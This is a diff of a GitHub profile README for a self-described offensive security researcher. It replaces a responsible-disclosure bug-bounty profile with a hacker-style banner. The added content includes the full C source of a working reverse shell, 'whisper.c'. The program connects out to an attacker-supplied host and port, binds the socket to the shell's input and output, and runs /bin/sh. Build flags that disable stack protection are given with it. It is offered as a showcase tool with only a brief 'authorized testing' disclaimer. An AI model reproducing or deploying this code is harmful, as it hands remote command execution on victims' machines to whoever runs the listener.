@@ -1,82 +1,100 @@
-<h1 align="center">Hi there, I'm <code>nullwhisper</code> 👋</h1>
-<p align="center">
-  <sub>by <code>alfacyber7</code></sub>
-</p>
-<p align="center">
-  <b>Bug Bounty Hunter · Security Researcher · Ethical Hacker</b>
-</p>
+<div align="center">
 
-<p align="center">
-  <a href="https://github.com/nullwhisper">
-    <img src="https://img.shields.io/badge/GitHub-nullwhisper-181717?style=flat-square&logo=github&logoColor=white" alt="GitHub">
-  </a>
-  <img src="https://komarev.com/ghpvc/?username=nullwhisper&style=flat-square&color=0f7fc1" alt="Profile Views">
-</p>
+```
+                ____         __    _                     
+   ____  __  __/ / /      __/ /_  (_)________  ___  _____
+  / __ \/ / / / / / | /| / / __ \/ / ___/ __ \/ _ \/ ___/
+ / / / / /_/ / / /| |/ |/ / / / / (__  ) /_/ /  __/ /    
+/_/ /_/\__,_/_/_/ |__/|__/_/ /_/_/____/ .___/\___/_/     
+                                     /_/                 
+```
 
----
+Vulnerability Research  ·  Exploit Development  ·  Reverse Engineering
 
-## 🛡️ About Me
+`offensive security researcher · bug bounty hunter · 0-day research`
 
-I hunt bugs and report them responsibly through bug bounty programs and coordinated vulnerability disclosure (CVD). My focus is on **web application security**, **API security**, and **reconnaissance automation**.
+[![GitHub](https://img.shields.io/badge/GitHub-nullwhisper-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/nullwhisper)
+[![Profile Views](https://komarev.com/ghpvc/?username=nullwhisper&style=flat-square&color=0f7fc1)](https://github.com/nullwhisper)
 
-- 🔭 Currently hunting on public bug bounty platforms
-- 🌱 Learning: advanced IDOR, SSRF, authentication flaws, cloud misconfigurations
-- 🛠️ Favorite tools: Burp Suite, Nuclei, ffuf, httpx, subfinder, amass
-- 📝 I write security writeups and share tooling for authorized testing
+<br>
 
-> ⚠️ All research is published under responsible disclosure and for **authorized security testing only**.
+```c
+/*
+ * whisper.c — minimal reverse shell, stripped
+ * build: gcc -s -fno-stack-protector -z execstack -o whisper whisper.c
+ * usage: ./whisper <host> <port>
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 
----
+int main(int argc, char **argv) {
+    if (argc != 3) {
+        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
+        return 1;
+    }
 
-## 🧰 Tech Stack
+    const char *host = argv[1];
+    int port = atoi(argv[2]);
 
-<p align="left">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Bash-121011?style=flat-square&logo=gnu-bash&logoColor=white" alt="Bash">
-  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black" alt="JavaScript">
-  <img src="https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go">
-  <img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black" alt="Linux">
-  <img src="https://img.shields.io/badge/Git-F05032?style=flat-square&logo=git&logoColor=white" alt="Git">
-</p>
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return 1;
 
----
+    struct sockaddr_in sin = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(port),
+    };
+    inet_aton(host, &sin.sin_addr);
 
-## 📚 Bug Bounty Writeups
+    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+        return 1;
 
-| Date | Program | Finding | Status |
-|------|---------|---------|--------|
-| `Coming soon` | - | - | - |
+    dup2(sock, STDIN_FILENO);
+    dup2(sock, STDOUT_FILENO);
+    dup2(sock, STDERR_FILENO);
 
-*Only disclosed and safe-to-share cases are published here.*
+    char *shell = "/bin/sh";
+    char *args[] = { shell, NULL };
+    execve(shell, args, NULL);
 
----
+    return 0;
+}
+```
 
-## ⚙️ Projects & Tools
+<br>
 
-- [`recon-scripts`](https://github.com/nullwhisper) *(coming soon)* — reusable recon automation for bug bounty.
-- [`nuclei-custom-templates`](https://github.com/nullwhisper) *(coming soon)* — custom Nuclei templates from personal research.
+Research published for educational and authorized testing purposes only. CVEs under responsible disclosure.
 
----
-
-## 📊 GitHub Stats
-
-<p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=nullwhisper&show_icons=true&theme=tokyonight&hide_border=true&bg_color=0d1117" alt="GitHub Stats" width="48%">
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=nullwhisper&layout=compact&theme=tokyonight&hide_border=true&bg_color=0d1117" alt="Top Languages" width="48%">
-</p>
-
----
-
-## 📬 Contact
-
-- GitHub: [@nullwhisper](https://github.com/nullwhisper)
-- Bug Bounty Platforms: HackerOne / Bugcrowd / Intigriti *(add your handles)*
-- Twitter/X / LinkedIn: *(add your links)*
-
-> 💬 Open for collaboration on security research, CTF teams, and responsible disclosure discussions.
+</div>
 
 ---
 
-## ⚠️ Disclaimer
+<div align="center">
 
-All tools, scripts, and writeups in my repositories are intended for **educational purposes** and **authorized security testing only**. Do not use them on systems you do not own or do not have explicit permission to test. I am not responsible for any misuse.
+### ⚔️ Arsenal
+
+![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
+![Go](https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white)
+![C](https://img.shields.io/badge/C-00599C?style=flat-square&logo=c&logoColor=white)
+![Bash](https://img.shields.io/badge/Bash-121011?style=flat-square&logo=gnu-bash&logoColor=white)
+
+![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=burpsuite&logoColor=white)
+![Nuclei](https://img.shields.io/badge/Nuclei-1B1B1D?style=flat-square)
+![Frida](https://img.shields.io/badge/Frida-FF4081?style=flat-square)
+![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=wireshark&logoColor=white)
+
+### 📊 Stats
+
+<img src="https://github-readme-stats.vercel.app/api?username=nullwhisper&show_icons=true&theme=dark&hide_border=true&bg_color=0d1117&text_color=0f7fc1&icon_color=0f7fc1" alt="GitHub Stats" width="49%">
+<img src="https://github-readme-activity-graph.vercel.app/graph?username=nullwhisper&theme=github-dark&hide_border=true&bg_color=0d1117&color=0f7fc1" alt="Activity Graph" width="49%">
+
+### 📡 Reach
+
+| Platform | Handle |
+|----------|--------|
+| GitHub | [@nullwhisper](https://github.com/nullwhisper) |
+
+</div>
